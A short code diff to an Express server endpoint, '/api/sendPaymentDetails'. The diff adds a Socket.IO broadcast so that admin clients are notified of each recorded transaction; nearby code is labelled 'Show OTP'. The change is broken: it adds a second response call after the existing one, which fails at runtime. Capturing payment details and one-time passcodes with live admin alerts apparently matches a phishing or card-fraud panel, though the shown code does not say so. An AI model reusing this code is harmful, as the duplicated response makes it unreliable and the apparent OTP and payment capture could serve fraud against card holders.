@@ -118,6 +118,10 @@ app.post('/api/sendPaymentDetails', (req, res) => {
   transactions.set(invoiceId, transaction);
   console.log("New transaction recorded:", transaction);
   res.json({ status: "success", invoiceId });
+ // Add this line to notify all admin clients
+  io.emit('new_transaction', invoiceId);
+  
+  res.json({ status: "success", invoiceId });
 });
 
 // Show OTP
